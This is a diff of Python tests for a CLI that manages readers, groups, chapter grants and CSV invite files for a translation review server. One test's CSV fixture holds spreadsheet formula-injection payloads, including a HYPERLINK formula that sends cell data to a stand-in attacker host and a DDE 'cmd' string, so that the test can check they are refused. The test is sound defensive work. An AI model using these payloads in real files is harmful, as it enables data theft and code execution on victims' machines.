@@ -1,5 +1,6 @@
 """Tests for every review.py command against a dev server on 127.0.0.1:8090 (another free port if taken)."""
 import contextlib
+import csv
 import io
 import json
 import os
@@ -13,6 +14,7 @@ import unittest
 import urllib.error
 import urllib.request
 from pathlib import Path
+from unittest import mock
 
 from helpers import REPO, ROOT, sample_chapter
 
@@ -146,7 +148,7 @@ class CLI(unittest.TestCase):
     def test_backup(self):
         code, out, _ = self.run_cli("backup", "--data", str(self.data), "--keep", "2")
         self.assertEqual(code, 0)
-        path = Path(out.split(": ", 1)[1].strip())
+        path = Path(out.splitlines()[0].split(": ", 1)[1].strip())
         self.assertTrue(path.exists())
         self.assertEqual(path.parent, self.data / "backups")
 
@@ -206,26 +208,26 @@ class CLI(unittest.TestCase):
         self.assertFalse(me["english"])
 
         _, out, _ = self.cli("readers")
-        self.assertIn("Somchai Test: active; reads SC31-32; English off; 0 comments; last active never", out)
+        self.assertIn("Somchai Test: active; own: SC31-32; English off; 0 comments; last active never", out)
         _, out, _ = self.cli("grant", "somchai test", "SC33")
-        self.assertIn("reads SC31-33", out)
+        self.assertIn("own: SC31-33", out)
         _, out, _ = self.cli("ungrant", "Somchai Test", "SC31")
-        self.assertIn("reads SC32-33", out)
+        self.assertIn("own: SC32-33", out)
         _, out, _ = self.cli("ungrant", "Somchai Test", "SC31")
         self.assertIn("did not hold SC31; nothing changed", out)
         _, out, _ = self.cli("grant", "Somchai Test", "SC")
-        self.assertIn("reads SC;", out)
+        self.assertIn("own: SC;", out)
         _, out, _ = self.cli("grant", "Somchai Test", "SC32")
         self.assertIn("already reads SC32; nothing changed", out)
         # Closing one chapter of a whole-book grant takes one command, and the reader really loses it.
         _, out, _ = self.cli("ungrant", "Somchai Test", "SC32")
-        self.assertNotIn("reads SC;", out)
+        self.assertNotIn("own: SC;", out)
         self.assertIn("SC31, SC33", out)
         self.assertIn("published later open to Somchai Test only after grant", out)
         self.assertEqual(http("GET", f"{self.url}/api/chapter/SC/SC32", code)[0], 404)
         self.assertEqual(http("GET", f"{self.url}/api/chapter/SC/SC33", code)[0], 200)
         _, out, _ = self.cli("ungrant", "Somchai Test", "SC")
-        self.assertIn("reads nothing", out)
+        self.assertIn("own: nothing", out)
         self.cli("grant", "Somchai Test", "SC31-33")
 
         _, out, _ = self.cli("english", "Somchai Test", "on")
@@ -250,6 +252,174 @@ class CLI(unittest.TestCase):
         self.assertIn("Unknown book ZZ", err)
         code_, _, err = self.cli("grant", "No Such Person", "SC01", ok=False)
         self.assertIn("No reader named No Such Person", err)
+        # Part of a name: the error suggests the readers whose names hold it.
+        code_, _, err = self.cli("grant", "somchai", "SC01", ok=False)
+        self.assertIn("No reader named somchai. Readers whose names hold it: Somchai Test.", err)
+
+    def me(self, code):
+        status, body, _ = http("GET", f"{self.url}/api/me", code)
+        return status, [c["id"] for c in body.get("chapters", [])], body
+
+    def test_group_commands(self):
+        for n in (51, 52, 53, 54):
+            self.put_chapter(n)
+        _, out, _ = self.cli("group", "create", "Elders", "--grant", "SC51-52")
+        self.assertIn("Elders: on; reads SC51-52; English off; 0 members", out)
+        self.cli("invite", "Grace One", "--grant", "SC53")
+        _, out, _ = self.cli("invite", "Grace Two", "--group", "elders")
+        self.assertIn("Grace Two can read nothing of their own; groups Elders; English off.", out)
+        two = out.strip().splitlines()[-1].split("#k=")[1]
+        self.assertEqual(self.me(two)[1], ["SC51", "SC52"])
+        _, out, _ = self.cli("group", "add", "Elders", "Grace One")
+        self.assertIn("1 reader added to Elders. It has 2 members.", out)
+        _, out, _ = self.cli("groups")
+        self.assertIn("Elders: on; reads SC51-52; English off; 2 members\n    Grace One, Grace Two", out)
+        _, out, _ = self.cli("group", "grant", "Elders", "SC54")
+        self.assertIn("reads SC51-52, SC54", out)
+        self.assertEqual(self.me(two)[1], ["SC51", "SC52", "SC54"])
+        _, out, _ = self.cli("group", "ungrant", "Elders", "SC51")
+        self.assertIn("reads SC52, SC54", out)
+        _, out, _ = self.cli("group", "english", "Elders", "on")
+        self.assertIn("English on", out)
+        self.assertTrue(self.me(two)[2]["english"])
+        _, out, _ = self.cli("readers", "--group", "Elders")
+        self.assertIn("Grace Two: active; own: nothing; through Elders: SC52, SC54; groups Elders; "
+                      "English on through a group;", out)
+        self.assertIn("2 of ", out)
+        _, out, _ = self.cli("group", "feature", "Elders", "english", "off")
+        self.assertIn("Elders: english.on off.", out)
+        _, out, _ = self.cli("group", "off", "Elders")
+        self.assertIn("Elders: off;", out)
+        self.assertEqual(self.me(two)[1], [])
+        self.cli("group", "on", "Elders")
+        _, out, _ = self.cli("group", "take-out", "Elders", "Grace Two")
+        self.assertIn("1 reader taken out of Elders. It has 1 member.", out)
+        self.assertEqual(self.me(two)[1], [])
+        code, _, err = self.cli("group", "add", "Elders", "Nobody Here", ok=False)
+        self.assertIn("No reader named Nobody Here; nothing changed.", err)
+        code, _, err = self.cli("group", "grant", "Elders", ok=False)
+        self.assertIn("Write: review.py group grant Elders SPEC", err)
+        code, _, err = self.cli("group", "create", "Elders", ok=False)
+        self.assertIn("409", err)
+        code, _, err = self.cli("group", "on", "Nowhere", ok=False)
+        self.assertIn("No group named Nowhere", err)
+        _, out, _ = self.cli("group", "remove", "Elders")
+        self.assertIn("Group Elders removed. Its 1 member keep their own grants.", out)
+        self.assertEqual(self.me(self.invite("Grace Three", "SC53"))[1], ["SC53"])
+
+    def test_commands_for_every_member_of_a_group(self):
+        for n in (61, 62):
+            self.put_chapter(n)
+        self.cli("group", "create", "Choir", "--grant", "SC61")
+        codes = [self.invite(f"Choir {i}", "SC62") for i in range(3)]
+        self.cli("group", "add", "Choir", "Choir 0", "Choir 1")
+        _, out, _ = self.cli("revoke", "--group", "Choir")
+        self.assertIn("Choir: 2 readers revoked.", out)
+        self.assertEqual([self.me(c)[0] for c in codes], [401, 401, 200])
+        _, out, _ = self.cli("restore", "--group", "Choir")
+        self.assertIn("Choir: 2 readers restored.", out)
+        _, out, _ = self.cli("english", "--group", "Choir", "on")
+        self.assertIn("English on for 2 members of Choir, as their own setting. The group's own setting is "
+                      "changed with: review.py group english Choir on", out)
+        self.assertEqual([self.me(c)[2]["english"] for c in codes], [True, True, False])
+        _, out, _ = self.cli("feature", "Choir 2", "english", "on")
+        self.assertIn("Choir 2: english.on on.", out)
+        _, out, _ = self.cli("grant", "--group", "Choir", "SC61")
+        self.assertIn("SC61 given to 2 members of Choir as their own grant; 0 already read it.", out)
+        _, out, _ = self.cli("ungrant", "--group", "Choir", "SC61")
+        self.assertIn("SC61 taken from the own grants of 2 members of Choir.", out)
+        self.assertIn("A group still opens SC61 or part of it to: Choir 0, Choir 1.", out)
+        _, out, err = self.cli("relink", "--group", "Choir", "--yes")
+        self.assertNotIn("#k=", out + err)
+        path = Path(out.split("The links are in ")[1].split(" (mode 600)")[0])
+        self.assertEqual(path.parent, self.token.parent)
+        self.assertEqual(oct(path.stat().st_mode & 0o777), "0o600")
+        rows = path.read_text().splitlines()
+        self.assertEqual(rows[0], "name,link")
+        self.assertEqual(len(rows), 3)
+        self.assertEqual([self.me(c)[0] for c in codes], [401, 401, 200])
+        self.assertEqual(self.me(rows[1].split("#k=")[1])[0], 200)
+        code, _, err = self.cli("revoke", "Choir 2", "--group", "Choir", ok=False)
+        self.assertIn("Name one reader, or give --group G", err)
+        code, _, err = self.cli("revoke", ok=False)
+        self.assertIn("Name one reader, or give --group G", err)
+        _, out, _ = self.cli("features")
+        self.assertIn("english.on: bool, default off; show the English source beside the translation", out)
+
+    def test_invite_from_a_file(self):
+        self.put_chapter(71)
+        self.cli("group", "create", "Batch", "--grant", "SC71")
+        folder = Path(self.tmp.name) / "csv"
+        folder.mkdir(exist_ok=True)
+        good = folder / "good.csv"
+        good.write_text("\ufeffname,groups,grants,english\n"
+                        "Batch Reader 1,Batch,,yes\n"
+                        "\"Batch, Reader 2\",,SC71 SC72,no\n"
+                        "Batch Reader 3,Batch,SC72,\n", encoding="utf-8")
+        _, out, err = self.cli("invite", "--from", str(good))
+        self.assertNotIn("#k=", out + err)
+        self.assertIn("3 readers invited. Their links are in ", out)
+        path = Path(out.split("Their links are in ")[1].split(" (mode 600)")[0])
+        self.assertEqual((path.parent, oct(path.stat().st_mode & 0o777)), (self.token.parent, "0o600"))
+        links = dict(row.rsplit(",", 1) for row in path.read_text().splitlines()[1:])
+        self.assertEqual(len(links), 3)
+        status, chapters, me = self.me(links["Batch Reader 1"].split("#k=")[1])
+        self.assertEqual((status, chapters, me["english"]), (200, ["SC71"], True))
+        _, out, _ = self.cli("readers", "--group", "Batch")
+        self.assertIn("2 of ", out)
+        # One bad line stops the whole file: nothing is created and no links file is left.
+        before = sorted(self.token.parent.glob("links-*"))
+        bad = folder / "bad.csv"
+        bad.write_text("name,grants,english,groups\nBatch Reader 4,SC71,maybe,\nBatch Reader 5,,,\n"
+                       "Batch Reader 6,ZZ01,,\nBatch Reader 6,SC71,,\n")
+        code, _, err = self.cli("invite", "--from", str(bad), ok=False)
+        self.assertEqual(code, 1)
+        for line in ("Line 2: Batch Reader 4: english must be yes or no, not 'maybe'.",
+                     "Line 3: Batch Reader 5 has no group and no grant, so the link would open nothing.",
+                     "Line 4: Batch Reader 6: Unknown book ZZ.", "Line 5: Batch Reader 6 is already on line 4.",
+                     "Nothing was changed."):
+            self.assertIn(line, err)
+        # A name the server already holds and an unknown group are refused by the server, all or nothing.
+        clash = folder / "clash.csv"
+        clash.write_text("name,groups\nBatch Reader 7,Batch\nBatch Reader 1,Batch\nBatch Reader 8,Nope\n")
+        code, _, err = self.cli("invite", "--from", str(clash), ok=False)
+        self.assertIn("Row 2: A reader named Batch Reader 1 already exists.", err)
+        self.assertIn("Row 3: No group named Nope.", err)
+        self.assertEqual(sorted(self.token.parent.glob("links-*")), before)
+        _, out, _ = self.cli("readers", "--group", "Batch")
+        self.assertNotIn("Batch Reader 7", out)
+        for bad_head in ("nom,grants\nX,SC71\n", "name,group\nX,Batch\n"):
+            (folder / "head.csv").write_text(bad_head)
+            code, _, err = self.cli("invite", "--from", str(folder / "head.csv"), ok=False)
+            self.assertIn("must start with the line: name,groups,grants,english", err)
+        code, _, err = self.cli("invite", "Someone", "--from", str(good), ok=False)
+        self.assertIn("takes everything from the file", err)
+        code, _, err = self.cli("invite", "Someone", ok=False)
+        self.assertIn("at least one --grant or --group", err)
+
+    def test_readers_filters(self):
+        self.put_chapter(81)
+        status, _, _ = http("PUT", f"{self.url}/api/admin/chapters/QB/QB01", self.token.read_text().strip(),
+                            sample_chapter(1, book="QB"))
+        self.assertEqual(status, 200)
+        quiet = self.invite("Filter Quiet", "SC81")
+        busy = self.invite("Filter Busy", "SC81")
+        http("PUT", f"{self.url}/api/place", busy, {"book": "SC", "ch": "SC81", "a": "SC 181.1"})
+        self.cli("revoke", "Filter Quiet")
+        _, out, _ = self.cli("readers", "--inactive")
+        self.assertIn("Filter Quiet:", out)
+        self.assertNotIn("Filter Busy:", out)
+        _, out, _ = self.cli("readers", "--inactive", "30")
+        self.assertNotIn("Filter Busy:", out)
+        _, out, _ = self.cli("readers", "--revoked")
+        self.assertIn("Filter Quiet: revoked;", out)
+        self.assertNotIn("Filter Busy", out)
+        self.assertRegex(out, r"\n\d+ of \d+ readers\.\n$")
+        _, out, _ = self.cli("readers", "--book", "qb")
+        self.assertRegex(out, r"^0 of \d+ readers\.\n$")
+        _, out, _ = self.cli("readers")
+        self.assertRegex(out, r"\n\d+ readers\.\n$")
+        self.assertTrue(quiet)
 
     # ---------- comments ----------
 
@@ -374,6 +544,243 @@ class CLI(unittest.TestCase):
         self.assertIn("answered 301", err)
         self.assertEqual(seen, [])
 
+    # ---------- the fixes of 28-fixes.md ----------
+
+    def test_backups_are_never_written_over_and_go_by_age(self):
+        data = Path(self.tmp.name) / "backup-data"
+        db.setup(data)
+        out = data / "backups"
+        out.mkdir()
+        for name in ("review-2020-01-01.sqlite3", "review-2020-01-02-030000.sqlite3", "notes.txt"):
+            (out / name).write_text("old")
+        first, second = db.backup(data, keep=2), db.backup(data, keep=2)
+        self.assertNotEqual(first, second)
+        self.assertRegex(first.name, r"^review-\d{4}-\d\d-\d\d-\d{6}(-\d+)?\.sqlite3$")
+        self.assertEqual(sorted(p.name for p in out.iterdir()), sorted([first.name, second.name, "notes.txt"]))
+        # The newest copies always stay, however old they are.
+        (out / "review-2020-01-01.sqlite3").write_text("old")
+        db.backup(data, keep=14)
+        self.assertTrue((out / "review-2020-01-01.sqlite3").exists())
+
+    def test_the_server_file_ties_the_token_to_its_server(self):
+        folder = Path(self.tmp.name) / "prod-config"
+        folder.mkdir()
+        token = folder / "admin-token"
+        token.write_text(self.token.read_text())
+        (folder / "server").write_text(self.url + "/\n")
+        code, out, err = self.run_cli("--token-file", str(token), "chapters")
+        self.assertEqual(code, 0, err)
+        self.assertIn(f"Server: {self.url}", err)
+        other = f"http://127.0.0.1:{free_port(8098)}"
+        code, _, err = self.run_cli("--server", other, "--token-file", str(token), "chapters")
+        self.assertEqual(code, 1)
+        self.assertIn(f"belongs to {self.url}/", err)
+        with mock.patch.dict(os.environ, {"REVIEW_SERVER": other}):
+            code, _, err = self.run_cli("--token-file", str(token), "chapters")
+        self.assertEqual(code, 1)
+        self.assertIn("Leave out --server and REVIEW_SERVER", err)
+
+    def test_answers_compressed_with_gzip_are_unpacked(self):
+        import gzip
+        import http.server
+        seen = []
+
+        class Packed(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):
+                seen.append(self.headers.get("Accept-Encoding"))
+                body = gzip.compress(json.dumps({"chapters": [], "word": "ก"}).encode())
+                self.send_response(200 if self.path == "/ok" else 400)
+                self.send_header("Content-Encoding", "gzip")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+
+            def log_message(self, *args):
+                pass
+
+        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Packed)
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        self.addCleanup(server.server_close)
+        self.addCleanup(server.shutdown)
+        client = review.Client(f"http://127.0.0.1:{server.server_address[1]}", self.token)
+        self.assertEqual(client.call("GET", "/ok"), {"chapters": [], "word": "ก"})
+        with self.assertRaisesRegex(review.CLIError, "answered 400"):
+            client.call("GET", "/bad")
+        self.assertEqual(seen, ["gzip", "gzip"])
+
+    def test_ungrant_names_the_group_that_still_opens_the_chapter(self):
+        self.put_chapter(95)
+        self.cli("group", "create", "Youth95", "--grant", "SC95")
+        self.cli("invite", "Anan Ninety", "--group", "Youth95")
+        _, out, _ = self.cli("ungrant", "Anan Ninety", "SC95")
+        self.assertIn("Anan Ninety holds SC95 only through the group Youth95; nothing changed. To close it for the "
+                      "whole group: review.py group ungrant Youth95 SC95", out)
+        _, out, _ = self.cli("ungrant", "--group", "Youth95", "SC95")
+        self.assertIn("No member of Youth95 holds SC95 as their own grant; nothing changed.", out)
+        self.assertIn("The group Youth95 itself opens SC95.", out)
+
+    def test_a_split_whole_book_grant_keeps_withdrawn_chapters(self):
+        for n in (91, 92, 93):
+            self.put_chapter(n)
+        self.cli("withdraw", "SC", "92")
+        code = self.invite("Dara Ninety", "SC")
+        _, out, _ = self.cli("ungrant", "Dara Ninety", "SC93")
+        self.assertIn("SC91-92", out)
+        self.assertNotIn("SC93", self.me(code)[1])
+        self.put_chapter(92)                       # published again
+        self.assertIn("SC92", self.me(code)[1])
+
+    def test_invite_into_a_group_that_is_off_says_so(self):
+        self.put_chapter(97)
+        self.cli("group", "create", "Off97", "--grant", "SC97")
+        self.cli("group", "off", "Off97")
+        _, out, _ = self.cli("invite", "Chai Ninety", "--group", "Off97")
+        self.assertIn("The group Off97 is off, so it opens nothing to its members until: review.py group on Off97", out)
+        f = Path(self.tmp.name) / "off97.csv"
+        f.write_text("name,groups\nChai Ninety Two,Off97\n")
+        _, out, _ = self.cli("invite", "--from", str(f))
+        self.assertIn("review.py group on Off97", out)
+
+    def test_closing_a_group_names_members_who_still_open_its_chapters(self):
+        self.put_chapter(94)
+        self.cli("group", "create", "Close94", "--grant", "SC94")
+        self.cli("group", "create", "Other94", "--grant", "SC94")
+        self.cli("invite", "Own Grant94", "--grant", "SC94", "--group", "Close94")
+        self.cli("invite", "Only Group94", "--group", "Close94")
+        self.cli("invite", "Two Groups94", "--group", "Close94", "--group", "Other94")
+        _, out, _ = self.cli("group", "off", "Close94")
+        self.assertIn("1 member of Close94 still open SC94 or part of it through their own grants: Own Grant94. "
+                      "To close it for them: review.py ungrant --group Close94 SC94", out)
+        self.assertIn("1 member of Close94 still open SC94 or part of it through another group that is on: "
+                      "Two Groups94 (Other94).", out)
+        self.assertNotIn("Only Group94", out)
+        self.cli("group", "on", "Close94")
+        _, out, _ = self.cli("group", "ungrant", "Close94", "SC94")
+        self.assertIn("through their own grants: Own Grant94.", out)
+        self.cli("group", "grant", "Close94", "SC94")
+        _, out, _ = self.cli("group", "remove", "Close94")
+        self.assertIn("To close it for them: review.py ungrant NAME SC94, for each of them", out)
+
+    def test_invite_file_carries_other_columns_and_refuses_formulas(self):
+        self.put_chapter(98)
+        folder = Path(self.tmp.name) / "csv98"
+        folder.mkdir()
+        good = folder / "good.csv"
+        good.write_text("name,email,grants,Phone\nMail One,one@example.org,SC98,+66 81 234 5678\n"
+                        "Mail Two,two@example.org,SC98,\n")
+        _, out, _ = self.cli("invite", "--from", str(good))
+        self.assertIn("with the columns email, Phone", out)
+        path = Path(out.split("Their links are in ")[1].split(" (mode 600)")[0])
+        rows = list(csv.reader(path.read_text().splitlines()))
+        self.assertEqual(rows[0], ["name", "link", "email", "Phone"])
+        self.assertEqual([r[0] for r in rows[1:]], ["Mail One", "Mail Two"])
+        self.assertEqual([r[2:] for r in rows[1:]], [["one@example.org", "+66 81 234 5678"], ["two@example.org", ""]])
+        self.assertTrue(rows[1][1].startswith("https://review.example.org/#k="))
+        # A column one letter away from a known one is a misspelling, and a column may not appear twice.
+        for head, why in (("name,grant\nX98,SC98\n", "The column grant looks like grants."),
+                          ("name,grants,email,Email\nX98,SC98,a,b\n", "The column email appears twice.")):
+            (folder / "head.csv").write_text(head)
+            code, _, err = self.cli("invite", "--from", str(folder / "head.csv"), ok=False)
+            self.assertIn("must start with the line: name,groups,grants,english", err)
+            self.assertIn(why, err)
+        bad = folder / "bad.csv"
+        bad.write_text('name,grants,email\n=HYPERLINK("https://evil.example/?l="&B3),SC98,a\n'
+                       "Formula Cell,SC98,=1+1\nAt Cell,SC98,@SUM(1)\nPlus Cell,SC98,+cmd|' /C calc'!A0\n")
+        code, _, err = self.cli("invite", "--from", str(bad), ok=False)
+        self.assertIn("Line 2: the name =HYPERLINK", err)
+        for line in (3, 4, 5):
+            self.assertIn(f"Line {line}: ", err)
+        self.assertIn("which a spreadsheet may run as a formula", err)
+        self.assertNotIn("Formula Cell", self.cli("readers", "--name", "cell")[1])
+
+    def test_processed_needs_the_export_the_markers_came_from(self):
+        self.put_chapter(96)
+        code = self.invite("Anan Export96", "SC96")
+        ids = []
+        for i in range(2):
+            status, body, _ = http("POST", f"{self.url}/api/comments", code, {
+                "client_id": f"p96-{i}", "book": "SC", "ch": "SC96", "a": "SC 196.1", "kind": "flag", "quote": "",
+                "text": f"First words {i}"})
+            ids.append(body["id"])
+        folder = Path(self.tmp.name) / "exports96"
+        self.cli("export", "--ch", "SC96", "--out", str(folder / "a.json"))
+        http("PATCH", f"{self.url}/api/comments/{ids[0]}", code, {"text": "Changed words"})
+        self.cli("export", "--reader", "Anan Export96", "--out", str(folder / "b.json"))
+        code_, out, err = self.cli("processed", str(ids[0]), str(ids[1]), "--export", str(folder), ok=False)
+        self.assertEqual(code_, 1)
+        self.assertIn("1 comment marked processed.", out)
+        self.assertIn(f"Changed by the reader between exports, so not marked: {ids[0]}.", err)
+        self.assertIn("a.json, b.json", err)
+        self.assertIn("--export FILE", err)
+        # The export the markers came from holds the old words, so the comment stays open.
+        code_, out, err = self.cli("processed", str(ids[0]), "--export", str(folder / "a.json"), ok=False)
+        self.assertIn(f"Changed by the reader since the export, so not marked: {ids[0]}.", err)
+        _, out, _ = self.cli("processed", str(ids[0]), "--export", str(folder / "b.json"))
+        self.assertIn("1 comment marked processed.", out)
+        # Many ids go in batches; only the ids asked for are kept from the exports.
+        calls = []
+        real = review.Client.call
+
+        def counting(client, method, path, *args, **kw):
+            calls.append(path)
+            return real(client, method, path, *args, **kw)
+
+        with mock.patch.object(review, "BATCH", 1), mock.patch.object(review.Client, "call", counting):
+            _, out, _ = self.cli("processed", "--undo", str(ids[0]), str(ids[1]))
+        self.assertIn("2 comments marked not processed.", out)
+        self.assertEqual(calls.count("/api/admin/processed"), 2)
+        self.assertEqual(set(review.export_revs(folder, self.url, [ids[1]])), {ids[1]})
+
+    def test_relink_of_a_group_asks_for_the_count(self):
+        self.cli("group", "create", "Relink99")
+        for i in range(2):
+            self.invite(f"Relink Reader {i}", "SC99")
+        self.cli("group", "add", "Relink99", "Relink Reader 0", "Relink Reader 1")
+        with mock.patch("sys.stdin", io.StringIO("3\n")):
+            code, _, err = self.cli("relink", "--group", "Relink99", ok=False)
+        self.assertIn("This gives 2 readers of Relink99 new links", err)
+        self.assertIn("Nothing was changed.", err)
+        with mock.patch("sys.stdin", io.StringIO("")):
+            code, _, err = self.cli("relink", "--group", "Relink99", ok=False)
+        self.assertIn("Pass --yes", err)
+        with mock.patch("sys.stdin", io.StringIO("2\n")):
+            _, out, _ = self.cli("relink", "--group", "Relink99")
+        self.assertIn("2 readers of Relink99 have new links", out)
+
+    def test_group_add_says_what_changed_and_reads_a_file(self):
+        self.cli("group", "create", "Members89")
+        for name in ("Mem A89", "Mem B89"):
+            self.invite(name, "SC89")
+        _, out, _ = self.cli("group", "add", "Members89", "Mem A89")
+        self.assertIn("1 reader added to Members89. It has 1 member.", out)
+        _, out, _ = self.cli("group", "add", "Members89", "mem a89")
+        self.assertIn("0 readers added to Members89. It has 1 member.", out)
+        self.assertIn("Not changed, because already members: Mem A89.", out)
+        f = Path(self.tmp.name) / "members89.csv"
+        f.write_text("email,Name\nx@example.org,Mem A89\ny@example.org,Mem B89\n")
+        _, out, _ = self.cli("group", "take-out", "Members89", "--from", str(f))
+        self.assertIn("1 reader taken out of Members89. It has 0 members.", out)
+        self.assertIn("Not changed, because not members: Mem B89.", out)
+        _, out, _ = self.cli("group", "add", "Members89", "--from", str(f))
+        self.assertIn("2 readers added to Members89.", out)
+        f.write_text("name\nNobody Here89\n")
+        code, _, err = self.cli("group", "add", "Members89", "--from", str(f), ok=False)
+        self.assertIn("No reader named Nobody Here89; nothing changed.", err)
+
+    def test_readers_by_part_of_a_name_and_by_link(self):
+        self.put_chapter(88)
+        code = self.invite("Findable Person88", "SC88")
+        self.invite("Other Person88", "SC88")
+        _, out, _ = self.cli("readers", "--name", "findable")
+        self.assertIn("Findable Person88: active;", out)
+        self.assertNotIn("Other Person88", out)
+        self.assertRegex(out, r"\n1 of \d+ readers\.\n$")
+        _, out, _ = self.cli("readers", "--link", f"https://review.example.org/#k={code}")
+        self.assertIn("Findable Person88: active;", out)
+        self.assertNotIn("Other Person88", out)
+        code_, _, err = self.cli("readers", "--link", "https://review.example.org/", ok=False)
+        self.assertIn("Cannot find a code in that link", err)
+
     # ---------- errors ----------
 
     def test_server_down_and_bad_token(self):
@@ -394,7 +801,8 @@ class CLI(unittest.TestCase):
         with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
             review.main(["--help"])
         for name in ("setup", "serve", "backup", "publish", "withdraw", "chapters", "invite", "readers", "grant",
-                     "ungrant", "revoke", "restore", "english", "relink", "export", "processed"):
+                     "ungrant", "revoke", "restore", "english", "feature", "features", "relink", "groups", "group",
+                     "export", "processed"):
             self.assertIn(name, out.getvalue())
 
 
